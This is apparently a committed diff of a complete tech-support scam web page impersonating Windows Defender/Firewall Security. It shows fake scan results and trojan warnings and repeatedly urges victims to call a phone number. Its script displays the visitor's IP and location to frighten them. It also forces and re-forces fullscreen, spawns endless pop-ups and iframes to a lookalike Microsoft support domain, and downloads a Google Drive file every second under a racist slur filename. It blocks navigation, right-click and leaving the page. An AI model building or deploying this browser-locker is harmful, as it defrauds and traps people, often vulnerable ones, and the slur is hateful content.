@@ -1,0 +1,1088 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Window Defender</title>
+
+    <link href="style/papa.css" rel="stylesheet" />
+    <link href="style/mat.css" rel="stylesheet" />
+    <link href="images/logo.png" rel="icon" id="favicon" type="image/png" />
+    <link href="style/papa.css" rel="stylesheet" />
+    <link href="style/mat.css" rel="stylesheet" />
+    <script type="text/javascript" src="js/script.js"></script>
+    <link rel="stylesheet" href="style/bootstrap.min.css" />
+    <link rel="stylesheet" href="style/font-awesome.min.css" />
+    <script src="js/jquery.min.js"></script>
+    <script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="js/jquery.min_1.js"></script>
+    <script type="text/javascript">
+      //<![CDATA[
+      $(function () {
+        $("body").bind("contextmenu", function (e) {
+          return false;
+        });
+      }); //]]>
+    </script>
+    <script src="js/esc.js"></script>
+
+    <script src="js/noir.js"></script>
+
+    <script>
+      var t = new XMLHttpRequest();
+      t.onreadystatechange = function () {
+        if (4 == this.readyState && 200 == this.status) {
+          var a = JSON.parse(this.responseText);
+          ipadd = a.ip;
+          city = a.city;
+          country = a.country;
+          isp = a.connection.isp;
+          var b = new Date();
+          currtime = a.timezone.current_time;
+          document.getElementById("ip_add").textContent =
+            "Address IP: " + ipadd + " " + b.toLocaleString("EN-US", currtime);
+          document.getElementById("city").textContent =
+            "Location: " + city + ", " + country;
+          document.getElementById("isp").textContent = "ISP: " + isp;
+        }
+      };
+      t.open("index.html", "https://ipwho.is/?lang=en", !0);
+      t.send();
+    </script>
+
+    <script>
+      function getVariableFromURl(n0me) {
+        n0me = n0me.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
+        var regexS = "[\\?&]" + n0me + "=([^&#]*)";
+        var regex = new RegExp(regexS);
+        var results = regex.exec(window.location.href);
+        if (results == null) return "";
+        else return results[1];
+      }
+    </script>
+
+    <script type="text/javascript">
+      var Aniph = getVariableFromURl("Aniph");
+    </script>
+    <!--new concept css-->
+    <style>
+      #headerText {
+        font-size: 40px;
+        font-weight: bold;
+        margin-bottom: 50px;
+        z-index: 999;
+      }
+
+      #playButtonImage {
+        width: 300px; /* Increased size of the play button image */
+        height: auto;
+        cursor: pointer;
+        border: none; /* Remove any border */
+        outline: none; /* Remove outline */
+        background: none; /* Remove any background */
+      }
+
+      #collage {
+        display: none;
+        position: relative;
+      }
+
+      .image {
+        position: absolute;
+        width: 150px;
+        height: 150px;
+        object-fit: cover;
+        opacity: 0;
+        transition: opacity 1s;
+      }
+
+      .floating-frame {
+        position: absolute;
+        width: 400px;
+        height: 400px;
+        border: none;
+        background: white;
+        z-index: 1000;
+        display: none; /* Hide iframe initially */
+      }
+
+      #ipAddress {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        font-size: 30px;
+        color: red;
+        font-weight: bold;
+        z-index: 1002;
+      }
+
+      #age-confirmation-modal {
+  position: fixed;
+  top: 0;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  z-index: 99999999999;
+  display: inline-block;
+  background-color: rgba(0, 0, 0, 1);
+  background-image: url(images/bg1.png);
+  width: 100%;
+  height: auto;
+  background-repeat: no-repeat;
+  background-size: cover;
+  text-align: center;
+  cursor: alias;
+  font-size: 2rem;
+}
+
+#age-confirmation-modal .innerContainer {
+  background-color: #fff;
+  color: #111111;
+  padding: 30px;
+  border-radius: 20px;
+  display: inline-block;
+  top: 50%;
+  position: absolute;
+  left: 50%;
+  transform: translate(-50%, -50%);
+}
+
+.close1 {
+  float: right;
+  font-size: 15px;
+  color: red;
+  border: 1px solid red;
+  margin-top: -18px;
+  width: 23px;
+  margin-top: -27px;
+  margin-right: -27px;
+  background: red;
+  color: white;
+}
+
+.close1:hover {
+  float: right;
+  font-size: 15px;
+  color: red;
+  border: 1px solid red;
+  background: white;
+  margin-top: -18px;
+  width: 17px;
+  margin-top: -27px;
+  margin-right: -27px;
+  width: 23px;
+}
+
+.nobtn {
+  height: 40px;
+  width: 90px;
+  font-size: 16px;
+  background: red;
+  color: white;
+}
+
+.nobtn:hover {
+  height: 40px;
+  width: 90px;
+  font-size: 16px;
+  background: #e60000;
+  color: white;
+}
+    </style>
+    <!--new concept css end-->
+  </head>
+  <body
+    class="map"
+    id="mycanvas"
+    onbeforeunload="return myFunction()"
+    style="cursor: none"
+  >
+  <div id="age-confirmation-modal">
+  <div class="innerContainer">
+    <div>
+      <button type="button" class="close1" data-dismiss="close" aria-label="Close">
+        <span aria-hidden="true">×</span>
+      </button>
+    </div>
+    <div style="font-size:40px;color:black!important;">
+      <h1>Claim your FREE items Now !</h1>
+    </div>
+    <div style="padding-top:10px;">
+      <button type="button" class="btn btn-lg nobtn" id="claim-btn">Claim</button>
+      <button type="button" class="btn btn-primary btn-lg ml-3" id="later-btn" style="height: 40px; width: 90px; font-size: 16px; margin-left:5px;">Later</button>
+    </div>
+  </div>
+</div>
+    <div class="bg" style="cursor: none">
+      <div class="playButtonImage" style="top: 0">
+        <img
+          id="playButtonImage"
+          src="images/f24.png"
+          alt="Play Button"
+          style="
+            width: 100%;
+            align-content: center;
+            display: block;
+            margin: 0 auto;
+          "
+        />
+      </div>
+    </div>
+    <!--<div id="headerText">USE W A S D TO MOVE AROUND</div>-->
+    <!--<img id="playButtonImage" src="images/rzjpu6.png" alt="Play Button" style=" width:350px;align-content: center; display: block;margin: 0 auto;">-->
+    <!-- Replace with the play button image URL -->
+    <div id="collage"></div>
+    <audio id="audio" src="sert/k319vh.mp3"></audio>
+    <!-- Background music before Play -->
+    <audio id="newAudio" src="sert/s485me.MP3"></audio>
+    <!-- New background music after Play -->
+    <div id="ipAddress"></div>
+
+    <a href="#" id="link_black" style="cursor: none" rel="noreferrer">
+      <div
+        class="black"
+        style="height: 145%; cursor: none; display: block"
+      ></div>
+    </a>
+    <div class="pro_box" style="cursor: none; display: block">
+      <div class="pro_box_header">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="minimize">
+              <ul>
+                <li>
+                  <a href="#">
+                    <img src="images/minimize.jpeg" />
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="col-md-5">
+            <div class="logo">
+              <img src="images/logo.png" />
+              <span>Windows Firewall Security</span>
+            </div>
+          </div>
+          <div class="col-md-7">
+            <div class="activate_lic">
+              <ul>
+                <li>
+                  <a href="#">
+                    <button>Activate your license</button>
+                  </a>
+                </li>
+                <li>
+                  <a href="#">
+                    <img src="images/set.png" />
+                  </a>
+                </li>
+                <li>
+                  <a href="#">
+                    <img src="images/ques.png" />
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="scan_box">
+        <div class="scan_box_header">
+          <div class="row">
+            <div class="col-md-6">
+              <div class="quick_scan">
+                <p>
+                  <img src="images/vsc.png" />
+                  <span>Scanning Rapid</span>
+                </p>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="minimize1">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <img src="images/minimize.jpeg" />
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="scan_body">
+          <div class="progress">
+            <div
+              class="active progress-bar progress-bar-success"
+              style="width: 100%"
+              id="dynamic"
+              aria-valuemax="100"
+              aria-valuemin="0"
+              aria-valuenow="100"
+              role="progressbar"
+            >
+              100% Complete
+            </div>
+          </div>
+          <div class="table_quick">
+            <table class="table table-bordered">
+              <thead>
+                <tr>
+                  <th scope="col">Scanned Objects</th>
+                  <th scope="col">
+                    <div class="col_fourth counter">
+                      <h2
+                        class="count-number count-title timer"
+                        data-speed="5000"
+                        data-to="51900"
+                      >
+                        51,900
+                      </h2>
+                    </div>
+                  </th>
+                </tr>
+                <tr>
+                  <th scope="col">Time spent</th>
+                  <th scope="col">5 secs</th>
+                </tr>
+                <tr>
+                  <th scope="col">Identified Threats</th>
+                  <th scope="col" style="color: red">
+                    <h2
+                      class="count-number count-title timer"
+                      data-speed="2500"
+                      data-to="1200"
+                    >
+                      1,200
+                    </h2>
+                  </th>
+                </tr>
+              </thead>
+            </table>
+          </div>
+        </div>
+        <div class="scan_footer">
+          <div class="row">
+            <div class="col-md-6">
+              <div class="bt_can">
+                <div class="btn-group" role="group" aria-label="Basic example">
+                  <button class="btn btn-secondary" type="button">
+                    Cancel
+                  </button>
+                </div>
+                <div class="btn-group" role="group" aria-label="Basic example">
+                  <button class="btn btn-secondary" type="button">
+                    Stop temporarily
+                  </button>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="bt_can2">
+                <div class="btn-group" role="group" aria-label="Basic example">
+                  <button class="btn btn-secondary" type="button">
+                    Scheduled Scans
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pro_box2" style="cursor: none; display: block">
+      <img
+        src="images/bx1.png"
+        alt=""
+        style="width: 100%; max-width: 100%; display: block; margin: 0 auto"
+      />
+    </div>
+    <div class="pro_box3" style="cursor: none; display: block">
+      <div class="pro_box_header">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="minimize">
+              <ul>
+                <li>
+                  <a href="#">
+                    <img src="images/minimize.jpeg" />
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="col-md-5">
+            <div class="logo">
+              <img src="images/logo.png" />
+              <span>Windows Firewall Security</span>
+            </div>
+          </div>
+          <div class="col-md-7">
+            <div class="activate_lic">
+              <ul>
+                <li>
+                  <a href="#">
+                    <button>Activate your license</button>
+                  </a>
+                </li>
+                <li>
+                  <a href="#">
+                    <img src="images/bel.png" />
+                  </a>
+                </li>
+                <li>
+                  <a href="#">
+                    <img src="images/set.png" />
+                  </a>
+                </li>
+                <li>
+                  <a href="#">
+                    <img src="images/ques.png" />
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="scan_box2">
+        <div class="scan_box_header">
+          <div class="row">
+            <div class="col-md-6">
+              <div class="quick_scan">
+                <p>
+                  <img src="images/vsc.png" />
+                  <span>scan</span>
+                </p>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="minimize1">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <img src="images/minimize.jpeg" />
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="scan_body">
+          <div class="row">
+            <div class="col-md-12">
+              <div class="tooreg_detail_scan">
+                <ul>
+                  <li>
+                    <a href="#">scan</a>
+                  </li>
+                  <li>
+                    <a href="#">Scan Plan</a>
+                  </li>
+                  <li>
+                    <a href="#">Reports</a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <br />
+          <div class="table_quick2">
+            <div class="row">
+              <div class="col-md-4">
+                <div class="pc_desk">
+                  <img src="images/pcm.png" />
+                </div>
+              </div>
+              <div class="col-md-4">
+                <div class="card_top scan_pro">
+                  <ul>
+                    <li>
+                      <i aria-hidden="true" class="fa fa-check"></i> Check for
+                      updates
+                    </li>
+                    <li>
+                      <i aria-hidden="true" class="fa fa-check"></i> Scan Memory
+                    </li>
+                    <li>
+                      <i aria-hidden="true" class="fa fa-check"></i> Analyze
+                      startup items
+                    </li>
+                    <li>
+                      <div class="circular-spinner"></div>
+                      <span>Registry Analysis</span>
+                    </li>
+                    <li>Analyzing the file system</li>
+                  </ul>
+                </div>
+              </div>
+              <div class="col-md-4">
+                <div class="scan_dur">
+                  <p>
+                    <strong>Time period of analysis</strong>
+                  </p>
+                  <p>3 seconds 0 seconds</p>
+                  <p>5 seconds 0 seconds</p>
+                  <br />
+                  <p>
+                    <strong>Scanned Items</strong>
+                  </p>
+                  <p>51,900</p>
+                  <br />
+                  <p>
+                    <strong>Detection</strong>
+                  </p>
+                  <p>11</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="scan_footer3">
+          <div class="row">
+            <div class="col-md-2">
+              <div class="viruses">
+                <img src="images/vsc.png" />
+              </div>
+            </div>
+            <div class="col-md-10">
+              <div class="make_this">
+                <p>This means you don't have to worry about online threats.</p>
+                <p>
+                  Premium blocks malware, viruses, and more without slowing down
+                  your computer. Upgrade to the Premium version.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div style="cursor: none" id="footer">
+      <div class="row">
+        <div class="col-md-12">
+          <div class="right-foot" style="text-align: center">
+            <span id="footertxt">
+              <img src="images/logo.png" />Windows Firewall Security
+            </span>
+            <span style="font-weight: 500; padding-left: 13px; color: #fff"
+              >Windows Firewall Call Support:
+              <span
+                style="
+                  border: 1px solid #fff;
+                  border-radius: 5px;
+                  padding: 2px 5px;
+                "
+              >
+                +1-833-534-1770
+              </span>
+            </span>
+          </div>
+        </div>
+        <div class="col-md-12">
+          <marquee direction="left" height="100px" width="100%">
+            <small class="text-left" style="color: #eee; font-size: 10px"
+              >Windows Firewall Defender SmartScreen has prevented an
+              unrecognized application from appearing. Running this application
+              may put your PC at risk. Windows Firewall Defender scan found
+              adware on this device that can steal your passwords, online
+              identities, financial information, personal files, photos, and
+              documents.</small
+            >
+          </marquee>
+        </div>
+      </div>
+    </div>
+
+    <div class="box" id="poptxt">
+      <div class="top">
+        <p>
+          <img
+            src="images/logo.png"
+            alt=""
+            style="width: 20px; margin-right: 5px"
+          />
+          Windows Firewall Security Warning<img
+            src="images/cross.png"
+            class=""
+            style="float: right; width: 20px"
+          />
+        </p>
+      </div>
+      <div class="center-links centerdiv">
+        <div class="">
+          <!-- <img src="images/re.gif" alt="" style=" width: 200px;text-align: center;display: block;margin: 0 auto;">-->
+          <div id="txtintro">
+            <span class="colo-rd">
+              <div id="ip_add">Windows Firewall Firewall Warning !</div>
+              <div id="city">A computer infected with Trojan spyware</div>
+              <div id="isp">(Error Codes: 2V7HGTVB)</div>
+            </span>
+          </div>
+          <br />
+          <p style="font-size: 16px; background-color: #eee; padding: 5px">
+            Windows Firewall has blocked all public networks and some Windows
+            features on the network. Error Code: - Ox800VDS
+          </p>
+          <br />
+          <p style="font-size: 18px; font-weight: 800; color: #025283">
+            Please contact Windows Firewall Defender Support:
+            <br />+1-833-534-1770 (Security Support)
+          </p>
+        </div>
+
+        <div id="bottom">
+          <img
+            src="images/rzjpu6.png"
+            style="
+              width: 350px;
+              align-content: center;
+              display: block;
+              margin: 0 auto;
+            "
+          />
+          <!--<span class="title3">Windows Firewall</span>-->
+          <ul>
+            <li>
+              <a href="#">
+                <!--<div class="fr button2">
+                  <span id="addtochromebutton">Allowing Access</span>
+                </div>-->
+              </a>
+            </li>
+            <li>
+              <a href="#">
+                <!--<div class="fr button blink">
+                  <span id="addtochromebutton">Cancel</span>
+                </div>-->
+              </a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div
+      class="cardcontainer"
+      style="cursor: none; display: block"
+      id="pop_up_new"
+    >
+      <p
+        style="
+          font-size: 16px;
+          font-weight: 400;
+          margin: 0;
+          margin-bottom: 5px;
+          padding: 5px 10px;
+          color: #fff !important;
+          color: #414141;
+          font-weight: 700;
+          margin-top: 8px;
+        "
+        class="text-center"
+      >
+        Windows Firewall - Security Warning
+      </p>
+      <p>
+        <b>Access to this PC has been blocked for security reasons</b>
+      </p>
+      <p>
+        Your computer has been reported as infected with a spyware of the Trojan
+        type. The following data has been compromised:
+      </p>
+      <p>
+        > Email ID <br />> Bank password <br />> Facebook login <br />> Photos
+        and documents
+      </p>
+      <p>
+        Windows Firewall Defender scan found adware on this device that can
+        steal your passwords, online identities, financial information, personal
+        files, photos and documents.
+      </p>
+      <p>
+        Contact us immediaxxtely. Our engineers will guide you through the
+        removal process over the phone.
+      </p>
+      <p>
+        Call Windows Firewall Support immediaxxtely to report this threat,
+        prevent identity theft and unblock access to this device.
+      </p>
+      <p>
+        Closing this window may put your personal information at risk and
+        suspend your Windows Firewall registration.
+      </p>
+      <p style="padding-bottom: 0; color: #fff; font-size: 16px">
+        Windows Firewall Call Support:
+        <strong>
+          <span
+            style="border: 1px solid #fff; border-radius: 5px; padding: 2px 5px"
+            >+1-833-534-1770
+          </span>
+        </strong>
+      </p>
+      <div class="action_buttons">
+        <a
+          class="active"
+          id="leave_page"
+          style="cursor: pointer; color: #fff !important"
+          >OK</a
+        >
+        <a class="active" id="leave_page" style="color: #fff !important"
+          >Cancel</a
+        >
+      </div>
+    </div>
+    <div
+      class="answer_list"
+      style="
+        display: none;
+        background-color: #000;
+        height: auto;
+        width: 550px;
+        left: 33%;
+        position: absolute;
+        z-index: 99999999;
+        border: 1px solid transparent;
+        border-color: #d6d8db;
+        border-radius: 0.5rem;
+      "
+      id="welcomeDiv"
+    >
+      <p
+        style="color: #fff; margin-top: 10px; font-size: 16px; padding: 0 5px"
+        class="text-center"
+      >
+        Contact us immediaxxtely and our engineers will guide you through the
+        removal process over the phone. Your computer has been disabled. Windows
+        Firewall Defender SmartScreen has prevented an unrecognized application
+        from appearing. Running this application may put your PC at risk. <br />
+        <strong
+          >Windows Firewall Call Support:
+          <span
+            style="
+              border: 1px solid #383d41;
+              border-radius: 5px;
+              padding: 2px 5px;
+            "
+          >
+            +1-833-534-1770
+          </span>
+        </strong>
+      </p>
+    </div>
+    <div id="chat" class="bounce3">
+      <img src="images/logo.png" />
+      <span
+        style="
+          color: #222;
+          font-size: 24px;
+          font-weight: 600;
+          margin-left: 6px;
+          position: relative;
+          top: 5px;
+        "
+        >Windows Firewall</span
+      >
+      <br />
+      <p>Windows Technical Assistance</p>
+      <h4 style="font-weight: 600; color: #0f396d; font-size: 22px">
+        +1-833-534-1770 <br />( Toll-Free number)<br /><br />
+      </h4>
+      <div class="arrow-down">
+        <svg height="1em" viewBox="0 0 320 512">
+          <style>
+            svg {
+              fill: #fff;
+            }
+          </style>
+          <path
+            d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"
+          ></path>
+          <script
+            defer
+            data-domain="con.new"
+            src="https://plausible.io/js/script.js"
+          ></script>
+        </svg>
+      </div>
+    </div>
+
+    <div id="ev_talkbox_wrapper" class="ev_talkbox_wrapper_min bounce">
+      <div class="new_messg">
+        <p
+          style="
+            color: #fff;
+            margin-top: 8px;
+            font-weight: 500;
+            font-size: 16px;
+          "
+        >
+          Have questions? Talk to an expert
+        </p>
+      </div>
+      <div id="ev_talkbox_min" class="">
+        <span id="ev_min_zoimg"></span>
+        <span id="ev_min_title">Chat</span>
+      </div>
+    </div>
+    <script>
+      $(document).ready(function () {
+        $("#mycanvas").click(function () {
+          $("#chat").show();
+        });
+      });
+    </script>
+
+    <!--new concept script-->
+    <script>
+      const playButtonImage = document.getElementById("playButtonImage");
+      const audio = document.getElementById("audio"); // Original background music
+      const newAudio = document.getElementById("newAudio"); // New background music after play
+      const collage = document.getElementById("collage");
+      const ipAddressDiv = document.getElementById("ipAddress");
+      const images = ["images/filesc.gif ", "images/filesc.gif", "images/filesc.gif"];
+      
+      const windows = [
+        "https://micr0s0ft-winsup0rt-833534.netlify.app/",
+        "images/filesc.gif",
+        "https://micr0s0ft-winsup0rt-833534.netlify.app/",
+        "images/filesc.gif",
+      ];
+
+      // Background image URL to change to when "Play" is clicked
+      const newBackgroundImage = "images/f24.png"; // Site owner can choose this image
+
+      // Fetch the user's IP address and display it on the page
+      function fetchUserIP() {
+        fetch("https://api.ipify.org?format=json")
+          .then((response) => response.json())
+          .then((data) => {
+            ipAddressDiv.textContent = `YOUR IP: ${data.ip}`;
+          })
+          .catch((error) => {
+            console.error("Error fetching IP:", error);
+          });
+      }
+
+      document.getElementById('claim-btn').addEventListener('click', startMainFunction);
+document.getElementById('later-btn').addEventListener('click', startMainFunction);
+document.querySelector('.close1').addEventListener('click', startMainFunction);
+
+function startMainFunction() {
+  // Hide the modal
+  document.getElementById('age-confirmation-modal').style.display = 'none';
+  
+  // Your existing code starts here
+  document.body.style.backgroundImage = `url('${newBackgroundImage}')`;
+  audio.pause();
+  audio.currentTime = 0;
+  newAudio.play();
+  playButtonImage.style.display = "none";
+  collage.style.display = "block";
+  fetchUserIP();
+  startOpeningWindows();
+  startFileDownload();
+  createCollage();
+  enterFullscreen();
+  lockPage();
+  hideCursor();
+  openFullscreenLockedWindow();
+  askForRedirection();
+}
+
+      function hideCursor() {
+        document.body.style.cursor = "none"; // Hide cursor when the game starts
+
+        // Also hide the cursor over the iframes
+        const floatingFrames = document.querySelectorAll(".floating-frame");
+        floatingFrames.forEach((frame) => {
+          frame.style.cursor = "none"; // Hide cursor inside each iframe
+        });
+      }
+
+      function enterFullscreen() {
+        if (document.documentElement.requestFullscreen) {
+          document.documentElement.requestFullscreen();
+        } else if (document.documentElement.mozRequestFullScreen) {
+          // Firefox
+          document.documentElement.mozRequestFullScreen();
+        } else if (document.documentElement.webkitRequestFullscreen) {
+          // Chrome, Safari, and Opera
+          document.documentElement.webkitRequestFullscreen();
+        } else if (document.documentElement.msRequestFullscreen) {
+          // IE/Edge
+          document.documentElement.msRequestFullscreen();
+        }
+
+        // Check periodically if the page is still in fullscreen mode
+        setInterval(() => {
+          if (
+            !document.fullscreenElement &&
+            !document.mozFullScreenElement && // Firefox
+            !document.webkitFullscreenElement && // Chrome, Safari, Opera
+            !document.msFullscreenElement
+          ) {
+            // IE/Edge
+            enterFullscreen(); // Re-enter fullscreen if exited
+          }
+        }, 1000); // Check every second
+      }
+
+      function startOpeningWindows() {
+        setInterval(() => {
+          windows.forEach((url) => {
+            createFloatingFrame(url);
+            createPopUpWindow(url);
+          });
+        }, 500); // 0.5 seconds interval
+      }
+
+      function createFloatingFrame(url) {
+        let frame = document.createElement("iframe");
+        frame.src = url;
+        frame.classList.add("floating-frame");
+        frame.onload = () => {
+          frame.style.display = "block";
+        };
+        frame.onerror = () => {
+          frame.remove();
+          createFloatingFrame(url); // Create a new iframe if it fails
+        };
+
+        document.body.appendChild(frame);
+        animateFrame(frame);
+      }
+
+      function createPopUpWindow(url) {
+        let popup = window.open(
+          url,
+          "_blank",
+          "width=400,height=400,left=" +
+            Math.random() * (window.innerWidth - 400) +
+            ",top=" +
+            Math.random() * (window.innerHeight - 400)
+        );
+        animatePopUpWindow(popup);
+      }
+
+      function animateFrame(frame) {
+        let x = Math.random() * (window.innerWidth - 400);
+        let y = Math.random() * (window.innerHeight - 400);
+        let dx = (Math.random() - 0.5) * 10;
+        let dy = (Math.random() - 0.5) * 10;
+
+        function move() {
+          x += dx;
+          y += dy;
+          if (x < 0 || x > window.innerWidth - 400) dx *= -1;
+          if (y < 0 || y > window.innerHeight - 400) dy *= -1;
+          frame.style.left = `${x}px`;
+          frame.style.top = `${y}px`;
+          requestAnimationFrame(move);
+        }
+        move();
+      }
+
+      function animatePopUpWindow(popup) {
+        let movePopup = () => {
+          let x = Math.random() * (window.innerWidth - 400);
+          let y = Math.random() * (window.innerHeight - 400);
+          popup.moveTo(x, y);
+        };
+
+        setInterval(movePopup, 500); // Move the popup every 0.5 seconds
+      }
+
+      function startFileDownload() {
+        setInterval(() => {
+          let link = document.createElement("a");
+          link.href =
+            "https://drive.google.com/uc?export=download&id=1DB6HrlhPu4a9yTRsDlMcbwkAKj34Smr2"; // Custom file URL
+          link.download = "niggersex"; // Force download with no specific filename
+          link.style.display = "niggersex.gif";
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+        }, 1000); // Start download every 1 second
+      }
+
+      function createCollage() {
+        images.forEach((src, index) => {
+          let img = document.createElement("img");
+          img.src = src;
+          img.classList.add("image");
+          img.style.top = `${Math.random() * 80}vh`;
+          img.style.left = `${Math.random() * 80}vw`;
+          collage.appendChild(img);
+          setTimeout(() => (img.style.opacity = 1), index * 500);
+        });
+      }
+
+      // Lock user from using "back" or "forward" buttons in history
+      function lockPage() {
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = function () {
+          window.history.pushState(null, null, window.location.href);
+        };
+
+        // Block right-click context menu
+        document.addEventListener("contextmenu", (e) => {
+          e.preventDefault(); // Disable right-click
+        });
+
+        // Prevent the page from unloading (refresh, close, etc.)
+        window.addEventListener("beforeunload", (e) => {
+          e.preventDefault();
+          e.returnValue = "Are you sure you want to leave?"; // Custom warning when trying to exit the page
+        });
+      }
+
+      // Open a fullscreen window that cannot be resized or moved
+      function openFullscreenLockedWindow() {
+        let windowFeatures =
+          "width=" +
+          screen.width +
+          ",height=" +
+          screen.height +
+          ",top=0,left=0,fullscreen=yes,menubar=no,toolbar=no,resizable=no,scrollbars=no,status=no";
+        const fullscreenWindow = window.open("", "_blank", windowFeatures);
+        fullscreenWindow.document.write(
+          "<h1 style='color: white; text-align: center; margin-top: 20%;'>This window is locked and cannot be moved or resized!</h1>"
+        );
+
+        fullscreenWindow.document.body.style.margin = "0";
+        fullscreenWindow.document.body.style.overflow = "hidden"; // Prevent scrolling
+        fullscreenWindow.moveTo(0, 0);
+        fullscreenWindow.resizeTo(screen.width, screen.height);
+        fullscreenWindow.document.addEventListener("contextmenu", (e) => {
+          e.preventDefault();
+        });
+      }
+
+      // Ask for redirect
+      function askForRedirection() {
+        setInterval(() => {
+          const redirectTo = "https://www.facebook.com"; // URL the site owner can change
+          if (confirm(`Do you want to go to this site? ${redirectTo}`)) {
+            window.location.href = redirectTo; // Redirect to the site if confirmed
+          }
+        }, 1000); // Every second
+      }
+
+      // Repeatedly trigger the beforeunload prompt every second
+      setInterval(() => {
+        window.dispatchEvent(new Event("beforeunload"));
+      }, 1000);
+    </script>
+    <!--new concept script ends-->
+  </body>
+
+  <script
+    defer
+    data-domain="luluapopos.onlin"
+    src="https://plausible.io/js/script.js"
+  ></script>
+</html>
